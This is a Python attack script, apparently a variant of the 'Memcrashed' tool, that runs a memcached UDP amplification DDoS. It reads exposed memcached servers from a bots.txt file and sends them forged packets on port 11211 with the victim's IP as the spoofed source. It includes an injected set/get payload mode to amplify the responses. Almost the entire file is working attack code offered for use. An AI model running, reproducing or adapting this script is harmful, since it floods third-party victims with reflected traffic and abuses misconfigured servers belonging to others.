#-- coding: utf8 --
#!/usr/bin/python
#ROOTSEC
#HUB: https://r00ts3c.github.io/
#DISCORD: https://discord.gg/G6tfGDD
import sys, os, time, shodan
import logging
logging.getLogger("scapy3k.runtime").setLevel(logging.ERROR) ##removes the ipv6 warning
from pathlib import Path
from scapy.all import * ##please change it to from scapy3k.all import *    if giving error
from contextlib import contextmanager

starttime=time.time()

#@contextmanager
#def suppress_stdout():
#    with open(os.devnull, "w") as devnull:
#        old_stdout = sys.stdout
#        sys.stdout = devnull
#        try:
#            yield
#        finally:
#            sys.stdout = old_stdout







def memcrash(target):
    print(target)
   
   
    while True:
        print('')
        try:
            myresults = Path("./bots.txt") ##removed api entry and api check
            query = 'y'
            saveme = 'y'
            if myresults.is_file():
                
                ip_arrayn = []
                with open('bots.txt') as my_file:         ##uses pre-saved bots.txt
                    for line in my_file:
                        ip_arrayn.append(line)
                ip_array = [s.rstrip() for s in ip_arrayn]
            else:
                print('')
                print('[✘] Error: No bots stored locally, bots.txt file not found!')
                print('')
            if saveme.startswith('y') or query.startswith('y'):
                print('')
                target = input("[▸] Press enter: ")
                targetport = input("[▸] Enter target port number (Default 80): ") or "80"
                power = int(input("[▸] Enter preferred power (Default 1): ") or "1")
                print('')
                data = input("[] Enter payload contained inside packet: ") or "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
                if (data != "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"):
                    dataset = "set injected 0 3600 ", len(data)+1, "\r\n", data, "\r\n get injected\r\n"
                    setdata = ("\x00\x00\x00\x00\x00\x00\x00\x00set\x00injected\x000\x003600\x00%s\r\n%s\r\n" % (len(data)+1, data))
                    getdata = ("\x00\x00\x00\x00\x00\x00\x00\x00get\x00injected\r\n")
                    print("[] Payload transformed: ", dataset)
                print('')
            ##removed show bots list
                engage = input('[*] Ready to engage target %s? <Y/n>: ' % target).lower()
                if engage.startswith('y'):
                    if saveme.startswith('y'):
                        for i in ip_array:
                            if (data != "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"):
                                print('[] Sending 2 forged synchronized payloads to: %s' % (i))
                            #    with True:
                                send(IP(src=target, dst='%s' % i) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=setdata), count=1)
                                send(IP(src=target, dst='%s' % i) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=getdata), count=power)
                            else:
                                if power>1:
                                    print('[] Sending %d forged UDP packets to: %s' % (power, i))
                                    #with suppress_stdout():
                                    send(IP(src=target, dst='%s' % i) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=data), count=power)
                                elif power==1:
                                    print('[] Sending 1 forged UDP packet to: %s' % i)

                                    send(IP(src=target, dst='%s' % i) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=data), count=power)
                    else:
                        for result in results['matches']:
                            if (data != "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"):
                                print('[] Sending 2 forged synchronized payloads to: %s' % (i))
                                #with suppress_stdout():
                                send(IP(src=target, dst='%s' % result['ip_str']) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=setdata), count=1)
                                send(IP(src=target, dst='%s' % result['ip_str']) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=getdata), count=power)
                            else:
                                if power>1:
                                    print('[] Sending %d forged UDP packets to: %s' % (power, result['ip_str']))
                                    #with suppress_stdout():
                                    send(IP(src=target, dst='%s' % result['ip_str']) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=data), count=power)
                                elif power==1:
                                    print('[] Sending 1 forged UDP packet to: %s' % result['ip_str'])
                                    #with suppress_stdout():
                                    send(IP(src=target, dst='%s' % result['ip_str']) / UDP(sport=int(str(targetport)),dport=11211)/Raw(load=data), count=power)
                    print('')
                    print('[•] Task complete! Exiting Platform. Have a wonderful day.')
                    break
                else:
                    print('')
                    print('[✘] Error: %s not engaged!' % target)
                    print('[~] Restarting Platform! Please wait.')
                    print('')
            else:
                print('')
                print('[✘] Error: No bots stored locally')
                print('[~] Restarting Platform! Please wait.')
                print('')
        except shodan.APIError as e:
            print('[x] Exiting')

def run(target):
    targ=target
    print(target)
    memcrash(target)
def main():

    host_ip = input("IP: ")

    memcrash(host_ip)

if __name__ == "__main__":
    main()
